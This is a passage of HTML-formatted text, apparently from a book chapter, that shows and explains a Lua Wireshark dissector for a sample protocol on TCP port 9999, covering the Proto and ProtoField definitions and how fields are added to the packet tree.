style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dec</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(f_msgtype_s, buf(5, 1)):append_text("\t[*] ProtoField.string")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(f_msgtype_ud, buf(5,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1)):append_text("\t[*] ProtoField.uint8</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.DEC")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(f_msgtype_uh, buf(5,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1)):append_text("\t[*] ProtoField.uint8</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.HEX")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add the delim</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(buf(6, 1), delim .. "delim" .. delim)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add the msgdata</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(f_msgdata, buf(7,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >3)):append_text("\t[*] ProtoField.string")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add the</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >delim</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(buf(10, 1), delim .. "delim" .. delim)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--display the unicode addata taking into account size of the</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >buf</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--notice we pass in the optional value argument to ensure</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >it is treated as unicode</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree:add(f_addata, buf(11, -1), buf(11, -1):ustring())</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add addata as bytes subtree:add(f_addata_b, buf(11, -1))</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--load the tcp.port tables</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tcp_table = DissectorTable.get("tcp.port")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--register our protocol to handle tcp port 9999 tcp_table:add(9999,sample_proto)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section356" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The first thing this code does is to create a new </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Proto</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >object, which is where the name of the new protocol and its description is defined. In this case, we call the protocol </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"sample" </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and its description is </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"w4sp sample protocol"</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. This means that we can use </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"sample" </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >within the Wireshark filter window to show all packets that contain the sample protocol.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next step in creating a dissector is to define the protocol fields. This means we need to map our various protocol fields to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >objects and then register these </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.9500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >objects to our new protocol:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.0500pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create the fields so we can match on them in the filter box local f_len_h = ProtoField.uint16("sample.len_h", "Length", base.HEX,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.2500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >nil, nil, "This is the Length")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_len_d = ProtoField.uint16("sample.len_d", "Length", base.DEC,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >nil, nil, "This is the Length")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--transid is only a single byte so uint8</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_transid_d = ProtoField.uint8("sample.transid_d",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"Trans ID",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><a name="_bookmark653" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.DEC, nil, nil, "This is the Transaction ID")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_transid_h = ProtoField.uint8("sample.transid_h",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"Trans ID",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.HEX, nil, nil, "This is the Transaction ID")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--show both string and int</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_msgtype_s = ProtoField.string("sample.msgtype_s", "MsgType",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"This is the Message Type")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_msgtype_uh = ProtoField.uint8("sample.msgtype_uh", "MsgType",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.HEX, nil, nil, "This is the Message Type")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_msgtype_ud = ProtoField.uint8("sample.msgtype_ud", "MsgType",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.DEC, nil, nil, "This is the Message Type")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create the data</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.0000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >fields</span><span style="mso-spacerun:'yes';font-family:'Courier 